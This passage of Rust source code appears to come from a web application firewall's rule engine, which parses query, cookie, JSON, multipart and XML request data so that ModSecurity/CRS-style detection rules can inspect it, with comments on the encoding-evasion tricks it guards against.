use std::cell::{Cell, OnceCell, RefCell};
use std::collections::HashMap;
use std::rc::Rc;

use sentinel_core::context::{Phase, RequestContext, RuleMatch, Severity, WafDecision};
use tracing::{debug, warn};

use super::emitter::{CompiledRuleSet, Instruction, RuleMeta, TargetSpec};
use crate::dsl::ast::{
    InterpCmp, RuleAction, RulePhase, RuleSeverity, SetVar, SetVarOp, Transform,
};

/// Whether `phase` inspects the response rather than the request.
fn is_response_phase(phase: &Phase) -> bool {
    matches!(phase, Phase::ResponseHeaders | Phase::ResponseBody)
}

/// Whether the rule scores the RESPONSE: it declares CRS's outbound anomaly
/// score (`setvar:tx.outbound_anomaly_score[_plN]=+N`).
fn scores_outbound(meta: &RuleMeta) -> bool {
    meta.setvars
        .iter()
        .any(|sv| sv.name.starts_with("OUTBOUND_ANOMALY_SCORE"))
}

fn rule_phase_to_phase(rp: RulePhase) -> Phase {
    match rp {
        RulePhase::Connection => Phase::Connection,
        RulePhase::RequestHeaders => Phase::RequestHeaders,
        RulePhase::RequestBody => Phase::RequestBody,
        RulePhase::Upstream => Phase::Upstream,
        RulePhase::ResponseHeaders => Phase::ResponseHeaders,
        RulePhase::ResponseBody => Phase::ResponseBody,
        RulePhase::Logging => Phase::Logging,
    }
}

// ---------------------------------------------------------------------------
// Stack value
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
enum StackVal {
    Bool(bool),
    /// Reference-counted because a memoized target is shared with
    /// `RequestViews`: loading ARGS must not copy every argument per rule.
    Strings(Rc<Vec<String>>),
    Int(i64),
    Float(f32),
    Absent,
}

// ---------------------------------------------------------------------------
// Target extraction helpers
// ---------------------------------------------------------------------------

/// Parse a URL-encoded query string into (key, value) pairs.
fn parse_query_params(query: &str) -> Vec<(String, String)> {
    query
        .split('&')
        .filter(|kv| !kv.is_empty())
        .map(|kv| {
            let mut parts = kv.splitn(2, '=');
            // application/x-www-form-urlencoded + query-string semantics: '+'
            // encodes a space and must be replaced BEFORE percent-decoding (so a
            // literal '+' sent as %2B survives). Without this, payloads whose
            // spaces are '+'-encoded (the Go/GoTestWAF default) reach the rule
            // operators with literal '+' and evade @rx / @detectSQLi / @detectXSS.
            let k = percent_decode(&parts.next().unwrap_or("").replace('+', " "));
            let v = percent_decode(&parts.next().unwrap_or("").replace('+', " "));
            (k, v)
        })
        .collect()
}

/// `@validateUrlEncoding`: does this value contain malformed percent-encoding?
///
/// A `%` must be followed by exactly two hex digits. Anything else — a stray
/// `%`, `%zz`, or a `%` cut short by the end of the value — is what ModSecurity
/// calls URL-encoding abuse, and it matters because the WAF and the origin may
/// resolve the same bytes differently.
///
/// Scanned over BYTES: a multi-byte character cannot be a hex digit, and going
/// through `chars()` would only cost work.
fn has_invalid_url_encoding(s: &str) -> bool {
    let b = s.as_bytes();
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' {
            // Two bytes must FOLLOW index i, so the last valid start is len-3.
            if i + 2 >= b.len() {
                return true; // truncated: "…%" or "…%A"
            }
            if !b[i + 1].is_ascii_hexdigit() || !b[i + 2].is_ascii_hexdigit() {
                return true;
            }
            i += 3;
        } else {
            i += 1;
        }
    }
    false
}

/// `@validateUtf8Encoding`: do this value's percent-escapes decode to something
/// that is not valid UTF-8?
///
/// Catches overlong forms (`%c0%af` for `/`, `%e0%80%80` for NUL), surrogate
/// halves (`%ed%a0%80`), truncated sequences and out-of-range lead bytes. These
/// are decoder-differential attacks: a filter comparing decoded ASCII sees
/// nothing, while the origin's decoder yields the dangerous character.
///
/// ⚠️ Two-part check, and the second part is a deliberate approximation.
/// `parse_query_params` decodes with `decode_utf8_lossy`, so by the time an
/// `ARGS` value reaches an operator its invalid bytes have ALREADY been replaced
/// by U+FFFD and the originals are unrecoverable. Validating only the escapes
/// (part 1) would therefore make this operator inert for the exact targets CRS
/// 920250 names — the "present but cannot fire" failure this change exists to
/// remove. So a residual U+FFFD is treated as evidence of that lossy decode.
///
/// The cost is a narrow false positive: a client that legitimately sends U+FFFD
/// (valid UTF-8: `EF BF BD`) is indistinguishable from one whose bytes were
/// mangled. Accepted because 920250 is WARNING severity, contributes 3 to an
/// anomaly score rather than blocking alone, and is gated off by CRS default.
fn has_invalid_utf8_encoding(s: &str) -> bool {
    if s.as_bytes().contains(&b'%') {
        let raw: Vec<u8> = percent_encoding::percent_decode_str(s).collect();
        if std::str::from_utf8(&raw).is_err() {
            return true;
        }
    }
    s.contains('\u{FFFD}')
}

fn percent_decode(s: &str) -> String {
    percent_encoding::percent_decode_str(s)
        .decode_utf8_lossy()
        .into_owned()
}

/// Decode both standard `%XX` and Microsoft IIS-style `%uXXXX` Unicode escapes.
/// Used by the `UrlDecodeUni` transform to match ModSecurity's `t:urlDecodeUni`.
fn url_decode_uni(s: &str) -> String {
    // Fast path: if no `%`, nothing to decode.
    if !s.contains('%') {
        return s.to_owned();
    }

    let bytes = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' {
            // Check for %uXXXX (4 hex digits after 'u' or 'U').
            if i + 5 < bytes.len()
                && (bytes[i + 1] == b'u' || bytes[i + 1] == b'U')
                && bytes[i + 2..i + 6].iter().all(|b| b.is_ascii_hexdigit())
            {
                let hex = std::str::from_utf8(&bytes[i + 2..i + 6]).unwrap_or("0000");
                if let Ok(n) = u32::from_str_radix(hex, 16) {
                    if let Some(ch) = char::from_u32(n) {
                        out.push(ch);
                        i += 6;
                        continue;
                    }
                }
            }
            // Standard %XX — delegate to percent_encoding for the remainder.
            out.push_str(
                &percent_encoding::percent_decode_str(&s[i..])
                    .decode_utf8_lossy()
                    .chars()
                    .take(1)
                    .collect::<String>(),
            );
            // Advance past `%XX` (3 bytes if valid, 1 byte if not).
            if i + 2 < bytes.len()
                && bytes[i + 1].is_ascii_hexdigit()
                && bytes[i + 2].is_ascii_hexdigit()
            {
                i += 3;
            } else {
                out.pop();
                out.push(bytes[i] as char);
                i += 1;
            }
        } else {
            out.push(bytes[i] as char);
            i += 1;
        }
    }
    out
}

/// Parse the Cookie header into (name, value) pairs.
fn parse_cookies(header_val: &str) -> Vec<(String, String)> {
    header_val
        .split(';')
        .map(|c| c.trim())
        .filter_map(|c| {
            let mut p = c.splitn(2, '=');
            Some((p.next()?.to_owned(), p.next().unwrap_or("").to_owned()))
        })
        .collect()
}

/// Lower-cased `Content-Type` value, or empty string if absent/unparsable.
fn content_type(ctx: &RequestContext) -> String {
    ctx.request_headers
        .get("content-type")
        .and_then(|v| v.to_str().ok())
        .map(|ct| ct.to_ascii_lowercase())
        .unwrap_or_default()
}

/// The request's own Host header, lowercased, port stripped. Empty if absent.
fn request_host(ctx: &RequestContext) -> String {
    ctx.request_headers
        .get("host")
        .and_then(|v| v.to_str().ok())
        .map(|h| h.split(':').next().unwrap_or(h).trim().to_ascii_lowercase())
        .unwrap_or_default()
}

/// True if `value` contains a `scheme://host` URL whose host is off-domain
/// relative to `request_host` — i.e. not equal to it and not a subdomain of
/// it. Reproduces CRS 931130 (off-domain reference / RFI). When the request
/// has no Host header, any absolute URL counts as off-domain.
/// True if `value` parses as an IP address contained in any of `cidrs`.
///
/// Implements `@ipMatch` / `@ipMatchF`, which the CRS importer previously compiled to
/// `Operator::Never` — so every rule using them loaded successfully and could never
/// fire. Accepts a bare address (`10.0.0.1`) or a CIDR (`10.0.0.0/8`) in the rule
/// argument, and uses the SSRF module's permissive host parser so an attacker cannot
/// evade an allow/deny list by writing the same address in decimal or hex.
fn ip_in_any_cidr(value: &str, cidrs: &[String]) -> bool {
    let Some(ip) = crate::ssrf::parse_host_to_ip(value.trim()) else {
        return false;
    };
    cidrs.iter().any(|spec| {
        let spec = spec.trim();
        if spec.is_empty() {
            return false;
        }
        match spec.parse::<ipnet::IpNet>() {
            Ok(net) => net.contains(&ip),
            // A bare address is a /32 (or /128) — CRS rules write both forms.
            Err(_) => crate::ssrf::parse_host_to_ip(spec).is_some_and(|other| other == ip),
        }
    })
}

fn contains_off_domain_url(value: &str, request_host: &str) -> bool {
    let lower = value.to_ascii_lowercase();
    let mut search = lower.as_str();
    while let Some(pos) = search.find("://") {
        // Validate the scheme: alnum/+/-/. immediately before "://".
        let scheme: String = search[..pos]
            .chars()
            .rev()
            .take_while(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
            .collect();
        let scheme_ok = scheme
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic());

        let after = &search[pos + 3..];
        // Authority ends at the first path/query/fragment delimiter.
        let authority_end = after
            .find(['/', '?', '#', '\\', ' ', '\t', '"', '\''])
            .unwrap_or(after.len());
        let mut authority = &after[..authority_end];
        // Strip userinfo (`user:pass@`).
        if let Some(at) = authority.rfind('@') {
            authority = &authority[at + 1..];
        }
        // Strip a trailing `:port`.
        let host = authority.split(':').next().unwrap_or(authority);

        if scheme_ok && !host.is_empty() {
            if request_host.is_empty() {
                return true; // no own host → any absolute URL is off-domain
            }
            // On-domain iff host == own host, or host is a subdomain of it.
            let on_domain = host == request_host || host.ends_with(&format!(".{request_host}"));
            if !on_domain {
                return true;
            }
        }

        // Continue scanning past this occurrence.
        search = &search[pos + 3..];
    }
    false
}

/// Recursively flatten a JSON value into ModSecurity-style `(name, value)`
/// pairs.  Object keys become the parameter name; array elements inherit the
/// parent name (matching ModSecurity's `ARGS:json.path` behaviour closely
/// enough for detection).  Scalars are stringified; `null` is skipped.
fn flatten_json(prefix: &str, val: &serde_json::Value, out: &mut Vec<(String, String)>) {
    use serde_json::Value;
    match val {
        Value::Object(map) => {
            for (k, v) in map {
                let key = if prefix.is_empty() {
                    k.clone()
                } else {
                    format!("{prefix}.{k}")
                };
                flatten_json(&key, v, out);
            }
        }
        Value::Array(arr) => {
            for v in arr {
                // Array elements share the parent name (ModSecurity treats
                // repeated ARGS with the same name); keeps names meaningful.
                flatten_json(prefix, v, out);
            }
        }
        Value::String(s) => out.push((prefix.to_owned(), s.clone())),
        Value::Number(n) => out.push((prefix.to_owned(), n.to_string())),
        Value::Bool(b) => out.push((prefix.to_owned(), b.to_string())),
        Value::Null => {}
    }
}

// ---------------------------------------------------------------------------
// multipart/form-data parsing
// ---------------------------------------------------------------------------

/// Parsed components of a `multipart/form-data` request body.
#[derive(Default)]
struct MultipartParts {
    /// Non-file form fields: `(name, value)`.  These feed ARGS/ARGS_NAMES so
    /// injection delivered through a multipart form is inspected exactly like
    /// an `application/x-www-form-urlencoded` form.
    fields: Vec<(String, String)>,
    /// Original client filenames (the `filename=` attribute). ModSec `FILES`.
    filenames: Vec<String>,
    /// Field names of file-upload parts (the `name=` attribute). ModSec
    /// `FILES_NAMES`.
    field_names: Vec<String>,
    /// Combined byte size of every file part's content. ModSec
    /// `FILES_COMBINED_SIZE`.
    combined_size: usize,
    /// Every part's header lines as `(part_name, header_line)`. ModSec
    /// `MULTIPART_PART_HEADERS`.
    ///
    /// One entry per header LINE, kept verbatim (not lowercased, not trimmed),
    /// because CRS 922 inspects these bytes directly: 922130 looks for bytes
    /// outside `\x21-\x7E` in a header name, so normalising here would erase the
    /// very anomaly it hunts for. `part_name` is the form-field name from
    /// Content-Disposition, or empty when the part declares none.
    part_headers: Vec<(String, String)>,
}

/// Locate the first occurrence of `needle` within `haystack`.
///
/// `memmem` rather than a `windows()` scan: the multipart parser runs this over
/// the whole body once per part, and the naive scan compares at every offset.
fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || needle.len() > haystack.len() {
        return None;
    }
    memchr::memmem::find(haystack, needle)
}

/// Extract the `boundary` parameter from a `multipart/form-data` Content-Type.
/// The media type is matched case-insensitively, but the boundary value is
/// returned verbatim (boundaries are case-sensitive).  Note: ASCII-lowercasing
/// preserves byte length, so indices computed on the lowercased copy are valid
/// offsets into the original header value.
fn multipart_boundary(ctx: &RequestContext) -> Option<String> {
    let raw = ctx
        .request_headers
        .get("content-type")
        .and_then(|v| v.to_str().ok())?;
    let lower = raw.to_ascii_lowercase();
    if !lower.trim_start().starts_with("multipart/form-data") {
        return None;
    }
    let pos = lower.find("boundary=")? + "boundary=".len();
    let rest = raw[pos..].trim_start();
    let val = if let Some(stripped) = rest.strip_prefix('"') {
        stripped.split('"').next().unwrap_or("")
    } else {
        rest.split([';', ' ', '\t']).next().unwrap_or("")
    };
    (!val.is_empty()).then(|| val.to_owned())
}

/// Parse a `multipart/form-data` body into its constituent parts.  Malformed
/// or non-multipart bodies yield an empty result (fail-open on parse, but the
/// raw body is still reachable via `REQUEST_BODY` rules).
fn multipart_parts(ctx: &RequestContext) -> MultipartParts {
    let mut out = MultipartParts::default();
    let (Some(body), Some(boundary)) = (ctx.request_body.as_ref(), multipart_boundary(ctx)) else {
        return out;
    };
    let body: &[u8] = body;
    let delim = format!("--{boundary}");
    let delim = delim.as_bytes();
    // Searched for once per part, so its search table is built once.
    let delim_finder = memchr::memmem::Finder::new(delim);

    // Position just past the first boundary marker.
    let mut search_from = match delim_finder.find(body) {
        Some(p) => p + delim.len(),
        None => return out,
    };
    loop {
        let after = &body[search_from..];
        // "--" immediately after a delimiter marks the closing boundary.
        if after.starts_with(b"--") {
            break;
        }
        // The part body begins after the CRLF that terminates the delimiter line.
        let part_start = match find_bytes(after, b"\r\n") {
            Some(p) => search_from + p + 2,
            None => break,
        };
        // The part runs up to the next boundary delimiter.
        let next = match delim_finder.find(&body[part_start..]) {
            Some(p) => part_start + p,
            None => break, // no closing delimiter — treat as malformed, stop
        };
        // Trim the CRLF that precedes the delimiter from the part content.
        let mut part_end = next;
        if part_end >= part_start + 2 && &body[part_end - 2..part_end] == b"\r\n" {
            part_end -= 2;
        }
        parse_one_part(&body[part_start..part_end], &mut out);
        search_from = next + delim.len();
    }
    out
}

/// Parse a single multipart part (its headers and content) and record it.
fn parse_one_part(part: &[u8], out: &mut MultipartParts) {
    let (headers, content) = match find_bytes(part, b"\r\n\r\n") {
        Some(p) => (&part[..p], &part[p + 4..]),
        None => (part, &b""[..]),
    };
    let headers = String::from_utf8_lossy(headers);
    let mut name: Option<String> = None;
    let mut filename: Option<String> = None;
    for line in headers.split("\r\n") {
        if line
            .to_ascii_lowercase()
            .trim_start()
            .starts_with("content-disposition:")
        {
            name = disposition_param(line, "name");
            filename = disposition_param(line, "filename");
            break;
        }
    }

    // Record the header lines for MULTIPART_PART_HEADERS.
    //
    // Split on CRLF only, deliberately. A bare LF used as a header separator is
    // itself the smuggling trick rule 922130 exists to catch: keeping such a
    // line intact leaves the raw \n inside the value, where the rule's
    // out-of-range byte class matches it. Splitting on \n too would hide it.
    let part_label = name.clone().unwrap_or_default();
    for line in headers.split("\r\n") {
        if !line.is_empty() {
            out.part_headers.push((part_label.clone(), line.to_owned()));
        }
    }
    match filename {
        // A part with a `filename` attribute is a file upload.
        Some(fname) => {
            out.filenames.push(fname);
            if let Some(n) = name {
                out.field_names.push(n);
            }
            out.combined_size += content.len();
        }
        // Otherwise it is a regular form field; its value feeds ARGS.
        None => {
            if let Some(n) = name {
                out.fields
                    .push((n, String::from_utf8_lossy(content).into_owned()));
            }
        }
    }
}

/// Extract a `key="value"` (or unquoted `key=value`) parameter from a
/// Content-Disposition line.  The key is matched only on a token boundary
/// (start of line, or after `;`/whitespace) so that searching for `name`
/// does not match inside `filename`.
fn disposition_param(line: &str, key: &str) -> Option<String> {
    let lower = line.to_ascii_lowercase();
    let needle = format!("{key}=");
    let mut idx = 0usize;
    loop {
        let rel = lower[idx..].find(&needle)?;
        let at = idx + rel;
        let on_boundary = at == 0 || matches!(lower.as_bytes()[at - 1], b';' | b' ' | b'\t');
        if on_boundary {
            let rest = &line[at + needle.len()..];
            let val = if let Some(stripped) = rest.strip_prefix('"') {
                stripped.split('"').next().unwrap_or("")
            } else {
                rest.split([';', ' ', '\t']).next().unwrap_or("")
            };
            return Some(val.to_owned());
        }
        idx = at + needle.len();
    }
}

/// Parse POST-body parameters into `(name, value)` pairs.
///
/// ModSecurity's `ARGS` collection merges query-string and POST-body
/// parameters; the rule engine must inspect both so that body-borne attacks
/// (the common case for login/search forms and JSON APIs) are not missed.
/// Supports `application/x-www-form-urlencoded` and `application/json`
/// (including `+json` suffixes such as `application/vnd.api+json`).
///
/// Called only through `RequestViews::body`, which builds it once per call.
fn body_args(ctx: &RequestContext, views: &RequestViews) -> Vec<(String, String)> {
    let Some(body) = ctx.request_body.as_ref() else {
        return Vec::new();
    };
    let ct = views.content_type(ctx);
    if ct.starts_with("application/x-www-form-urlencoded") {
        let text = String::from_utf8_lossy(body);
        parse_query_params(&text)
    } else if ct.starts_with("application/json") || ct.contains("+json") {
        match serde_json::from_slice::<serde_json::Value>(body) {
            Ok(val) => {
                let mut out = Vec::new();
                flatten_json("", &val, &mut out);
                out
            }
            // Malformed JSON: fall back to scanning the raw body as one value
            // so obfuscated/broken payloads still reach the regex operators.
            Err(_) => vec![(String::new(), String::from_utf8_lossy(body).into_owned())],
        }
    } else if ct.starts_with("multipart/form-data") {
        // Non-file form fields feed ARGS exactly like a urlencoded form, so
        // injection delivered through a multipart body is inspected the same
        // way.  File parts are surfaced via the FILES* targets, not ARGS.
        views.multipart(ctx).fields.clone()
    } else if is_xml_content_type(ct) {
        // XML / SOAP bodies: surface element text, attribute values, and CDATA
        // into ARGS so payloads delivered inside XML reach the same operators
        // as form/JSON parameters (SOAP APIs are a common injection vector).
        parse_xml_args(body)
    } else {
        Vec::new()
    }
}

/// True for XML and SOAP content types — `text/xml`, `application/xml`,
/// `application/soap+xml`, and any `…+xml` suffix (e.g. `application/rss+xml`).
fn is_xml_content_type(ct: &str) -> bool {
    ct.starts_with("text/xml")
        || ct.starts_with("application/xml")
        || ct.starts_with("application/soap+xml")
        || ct.contains("+xml")
}

/// Flatten an XML/SOAP body into ModSecurity-style `(name, value)` pairs.
///
/// This is a detection-oriented extractor, **not** a validating parser: it
/// surfaces every element's text content (keyed by the element's local name),
/// every attribute value (keyed by the attribute name), and every CDATA section
/// — decoding the standard XML entities — so injection delivered inside XML
/// reaches the ARGS operators. Comments, processing instructions, DOCTYPE
/// declarations, namespaces, and DTDs are ignored. Malformed input fails open
/// (extracts what it can). Byte offsets only ever land on ASCII delimiters
/// (`<`, `>`, `]]>`, …), so all `&str` slicing stays on char boundaries.
fn parse_xml_args(body: &[u8]) -> Vec<(String, String)> {
    let text = String::from_utf8_lossy(body);
    let mut out: Vec<(String, String)> = Vec::new();
    let mut cur_elem = String::new();
    let bytes = text.as_bytes();
    let mut i = 0;

    while i < bytes.len() {
        if bytes[i] != b'<' {
            // Text node — runs up to the next tag.
            let end = text[i..].find('<').map(|p| i + p).unwrap_or(bytes.len());
            let chunk = &text[i..end];
            if !chunk.trim().is_empty() {
                out.push((cur_elem.clone(), decode_xml_entities(chunk)));
            }
            i = end;
            continue;
        }

        // A markup construct beginning at `<`.
        if text[i..].starts_with("<!--") {
            match text[i + 4..].find("-->") {
                Some(rel) => i += 4 + rel + 3,
                None => break,
            }
        } else if text[i..].starts_with("<![CDATA[") {
            let start = i + 9;
            match text[start..].find("]]>") {
                Some(rel) => {
                    let content = &text[start..start + rel];
                    if !content.trim().is_empty() {
                        out.push((cur_elem.clone(), content.to_owned()));
                    }
                    i = start + rel + 3;
                }
                None => break,
            }
        } else if text[i..].starts_with("<?") || text[i..].starts_with("<!") {
            // Processing instruction / DOCTYPE / declaration — skip to `>`.
            match text[i..].find('>') {
                Some(rel) => i += rel + 1,
                None => break,
            }
        } else {
            // Element start or end tag.
            let Some(rel) = text[i + 1..].find('>') else {
                break;
            };
            let inner = text[i + 1..i + 1 + rel].trim();
            i = i + 1 + rel + 1;
            if let Some(_close) = inner.strip_prefix('/') {
                // Closing tag — the element's text context ends.
                cur_elem.clear();
            } else {
                // Opening or self-closing tag: `name attr="v" .../`.
                let body_str = inner.trim_end_matches('/').trim();
                let name_end = body_str.find(char::is_whitespace).unwrap_or(body_str.len());
                cur_elem = local_name(&body_str[..name_end]);
                extract_xml_attributes(&body_str[name_end..], &mut out);
            }
        }
    }

    out
}

/// The local part of a possibly namespace-prefixed XML name
/// (`soap:Envelope` → `Envelope`).
fn local_name(raw: &str) -> String {
    raw.rsplit(':').next().unwrap_or(raw).to_owned()
}

/// Extract `name="value"` / `name='value'` attribute pairs from the portion of
/// a start tag after the element name, decoding XML entities in each value.
fn extract_xml_attributes(attrs: &str, out: &mut Vec<(String, String)>) {
    let chars: Vec<char> = attrs.chars().collect();
    let n = chars.len();
    let mut i = 0;
    while i < n {
        while i < n && chars[i].is_whitespace() {
            i += 1;
        }
        let name_start = i;
        while i < n && chars[i] != '=' && !chars[i].is_whitespace() {
            i += 1;
        }
        let name: String = chars[name_start..i].iter().collect();
        while i < n && chars[i].is_whitespace() {
            i += 1;
        }
        if i < n && chars[i] == '=' {
            i += 1;
            while i < n && chars[i].is_whitespace() {
                i += 1;
            }
            if i < n && (chars[i] == '"' || chars[i] == '\'') {
                let quote = chars[i];
                i += 1;
                let val_start = i;
                while i < n && chars[i] != quote {
                    i += 1;
                }
                let val: String = chars[val_start..i].iter().collect();
                if i < n {
                    i += 1; // consume the closing quote
                }
                if !name.is_empty() {
                    out.push((name, decode_xml_entities(&val)));
                }
            }
        }
    }
}

/// Decode the five predefined XML entities plus numeric character references
/// (`&#NN;` / `&#xHH;`). Unknown entities are left verbatim.
fn decode_xml_entities(s: &str) -> String {
    if !s.contains('&') {
        return s.to_owned();
    }
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(pos) = rest.find('&') {
        out.push_str(&rest[..pos]);
        let after = &rest[pos..];
        let Some(semi) = after.find(';') else {
            out.push('&');
            rest = &after[1..];
            continue;
        };
        let entity = &after[1..semi];
        let decoded = match entity {
            "lt" => Some('<'),
            "gt" => Some('>'),
            "amp" => Some('&'),
            "quot" => Some('"'),
            "apos" => Some('\''),
            _ => entity.strip_prefix('#').and_then(|num| {
                let cp = match num.strip_prefix(['x', 'X']) {
                    Some(hex) => u32::from_str_radix(hex, 16).ok(),
                    None => num.parse::<u32>().ok(),
                };
                cp.and_then(char::from_u32)
            }),
        };
        match decoded {
            Some(c) => {
                out.push(c);
                rest = &after[semi + 1..];
            }
            None => {
                // Not a recognised entity — keep the literal `&` and continue.
                out.push('&');
                rest = &after[1..];
            }
        }
    }
    out.push_str(rest);
    out
}

// ---------------------------------------------------------------------------
// Per-evaluate request views
// ---------------------------------------------------------------------------

/// A memoizable target and the transform chain applied to it.
type TransformKey = (TargetSpec, Vec<Transform>);

/// The request-derived collections rules read, each built at most ONCE per
/// `evaluate` call and shared by every rule that reads it.
///
/// Every rule loading an ARGS-family target used to re-parse the query string
/// and the body — JSON included — and every FILES rule re-split the multipart
/// envelope, so a request was parsed once per such rule (well over a hundred in
/// CRS) instead of once: about half of the evaluation time on a large body.
///
/// Filled lazily, so a view no rule reads is never built. It lives on the stack
/// of one `evaluate` call and never longer, which is what keeps it correct:
/// rules change TX variables, the scores and the verdict, never the request or
/// the response, so a view built from them stays true for the rest of the call.
/// What DOES change mid-call — TX variables, `MATCHED_VAR` — is never memoized;
/// see `memoizable`.
#[derive(Default)]
struct RequestViews {
    content_type: OnceCell<String>,
    host: OnceCell<String>,
    query: OnceCell<Vec<(String, String)>>,
    body: OnceCell<Vec<(String, String)>>,
    multipart: OnceCell<MultipartParts>,
    cookies: OnceCell<Vec<(String, String)>>,
    /// Extracted values of the memoizable targets, handed to the stack by
    /// reference count so that a rule loading ARGS copies nothing.
    targets: RefCell<HashMap<TargetSpec, Rc<Vec<String>>>>,
    /// The same values after a transform chain, keyed by target and chain.
    /// CRS repeats a handful of pairs across dozens of rules — 103 rules read
    /// ARGS through `t:urlDecodeUni` alone — and transforms are pure, so each
    /// pair is computed once.
    transformed: RefCell<HashMap<TransformKey, Rc<Vec<String>>>>,
    /// Bytes of transformed copies held in `transformed`; see
    /// `transform_memo_budget`.
    transformed_bytes: Cell<usize>,
}

impl RequestViews {
    /// Lower-cased `Content-Type`; see `content_type`.
    fn content_type(&self, ctx: &RequestContext) -> &str {
        self.content_type.get_or_init(|| content_type(ctx))
    }

    /// The request's own host; see `request_host`.
    fn host(&self, ctx: &RequestContext) -> &str {
        self.host.get_or_init(|| request_host(ctx))
    }

    /// Decoded query-string parameters, in request order.
    fn query(&self, ctx: &RequestContext) -> &[(String, String)] {
        self.query.get_or_init(|| {
            note_view_built(View::Query);
            parse_query_params(ctx.uri.query().unwrap_or(""))
        })
    }

    /// Body parameters, in body order; see `body_args`.
    fn body(&self, ctx: &RequestContext) -> &[(String, String)] {
        self.body.get_or_init(|| {
            note_view_built(View::Body);
            body_args(ctx, self)
        })
    }

    /// The parsed `multipart/form-data` body; empty for any other body.
    fn multipart(&self, ctx: &RequestContext) -> &MultipartParts {
        self.multipart.get_or_init(|| {
            note_view_built(View::Multipart);
            multipart_parts(ctx)
        })
    }

    /// `(name, value)` pairs of the `Cookie` header — the first one only, and
    /// none when it is not visible ASCII, as every cookie target has read it.
    fn cookies(&self, ctx: &RequestContext) -> &[(String, String)] {
        self.cookies.get_or_init(|| {
            note_view_built(View::Cookies);
            ctx.request_headers
                .get("cookie")
                .and_then(|v| v.to_str().ok())
                .map(parse_cookies)
                .unwrap_or_default()
        })
    }

    /// The values `spec` names: from the memo when the target may be memoized,
    /// extracted afresh when it may not.
    fn load(
        &self,
        spec: &TargetSpec,
        ctx: &RequestContext,
        last_matched: Option<&str>,
    ) -> Rc<Vec<String>> {
        if !memoizable(spec) {
            return Rc::new(extract_target(spec, ctx, self, last_matched));
        }
        if let Some(values) = self.targets.borrow().get(spec) {
            return Rc::clone(values);
        }
        let values = Rc::new(extract_target(spec, ctx, self, last_matched));
        self.targets
            .borrow_mut()
            .insert(spec.clone(), Rc::clone(&values));
        values
    }

    /// The values of a memoizable `spec` after `transforms`, computed once per
    /// call for each (target, chain) pair while the memory budget allows.
    fn load_transformed(
        &self,
        spec: &TargetSpec,
        transforms: &[Transform],
        ctx: &RequestContext,
    ) -> Rc<Vec<String>> {
        debug_assert!(memoizable(spec));
        let key = (spec.clone(), transforms.to_vec());
        if let Some(values) = self.transformed.borrow().get(&key) {
            return Rc::clone(values);
        }
        let base = self.load(spec, ctx, None);
        note_view_built(View::Transform);
        let out: Vec<String> = base
            .iter()
            .map(|s| apply_transforms(s.clone(), transforms))
            .collect();
        // On benign text most chains change nothing; sharing the untransformed
        // values then costs no memory at all.
        let out = if out == *base {
            base
        } else {
            // Each value's own header counts too: a body of a million one-byte
            // fields is mostly headers, and judging it by its text would let
            // the copies dwarf the budget.
            let bytes: usize = out
                .iter()
                .map(|s| s.len() + std::mem::size_of::<String>())
                .sum();
            let out = Rc::new(out);
            let held = self.transformed_bytes.get() + bytes;
            if held > transform_memo_budget(ctx) {
                // Past the budget: transform per rule, as without the memo,
                // rather than let a hostile body multiply its own size.
                return out;
            }
            self.transformed_bytes.set(held);
            out
        };
        self.transformed.borrow_mut().insert(key, Rc::clone(&out));
        out
    }
}

/// How many bytes of transformed copies one `evaluate` call may keep: twice the
/// bodies under inspection, with a 1 MiB floor so that small requests always
/// get the full benefit. A body built so that every chain rewrites every value
/// would otherwise hold one copy per distinct chain — dozens of times its own
/// size — where the memo-less VM held one at a time. Twice, because one
/// rewritten copy of every argument, value headers included, can outgrow the
/// body it came from.
fn transform_memo_budget(ctx: &RequestContext) -> usize {
    const FLOOR: usize = 1 << 20;
    let len = |b: &Option<bytes::Bytes>| b.as_ref().map_or(0, |b| b.len());
    let bodies = len(&ctx.request_body).saturating_add(len(&ctx.response_body));
    bodies.saturating_mul(2).max(FLOOR)
}

/// Whether `spec`'s values may be memoized for the rest of an `evaluate` call:
/// true for the collections that are expensive to build and derived from the
/// request or response alone, which no rule modifies.
///
/// Exhaustive on purpose, so a new target has to be classified here. Memoizing
/// one that reads VM state would be silently wrong: a TX variable written by a
/// `setvar` must be visible to the very next rule.
fn memoizable(spec: &TargetSpec) -> bool {
    match spec {
        TargetSpec::Args
        | TargetSpec::ArgsNames
        | TargetSpec::ArgsGet
        | TargetSpec::ArgsGetNames
        | TargetSpec::ArgsCombinedSize
        | TargetSpec::RequestBody
        | TargetSpec::RequestHeadersAll
        | TargetSpec::RequestHeadersNames
        | TargetSpec::RequestCookiesAll
        | TargetSpec::RequestCookiesNames
        | TargetSpec::RequestCookie(_)
        | TargetSpec::MultipartPartHeadersAll
        | TargetSpec::MultipartPartHeader(_)
        | TargetSpec::Files
        | TargetSpec::FilesNames
        | TargetSpec::FilesCombinedSize
        | TargetSpec::ResponseHeadersAll
        | TargetSpec::ResponseBody => true,
        // One short value each: a lookup would cost what extraction does.
        TargetSpec::RequestUri
        | TargetSpec::RequestFilename
        | TargetSpec::RequestMethod
        | TargetSpec::RequestLine
        | TargetSpec::RequestProtocol
        | TargetSpec::ReqbodyProcessor
        | TargetSpec::RequestHeader(_)
        | TargetSpec::QueryString
        | TargetSpec::ResponseHeader(_)
        | TargetSpec::RemoteAddr
        | TargetSpec::Geo => false,
        // Counted from the inner target, which is memoized itself when it can be.
        TargetSpec::CountOf(_) => false,
        // VM state: written by `setvar` and by the previous chain link.
        TargetSpec::TxVar(_) | TargetSpec::MatchedVar => false,
    }
}

/// A request view, for counting how often each is built.
#[derive(Clone, Copy)]
enum View {
    Query,
    Body,
    Multipart,
    Cookies,
    /// A transform chain run over a memoized target.
    Transform,
}

#[cfg(test)]
thread_local! {
    /// Builds of each view on this thread. Lets a test prove a view is parsed
    /// at most once per `evaluate` call; per-thread so parallel tests do not
    /// see each other's counts.
    static VIEW_BUILDS: Cell<[usize; 5]> = const { Cell::new([0; 5]) };
}

#[cfg(test)]
fn note_view_built(view: View) {
    VIEW_BUILDS.with(|builds| {
        let mut n = builds.get();
        n[view as usize] += 1;
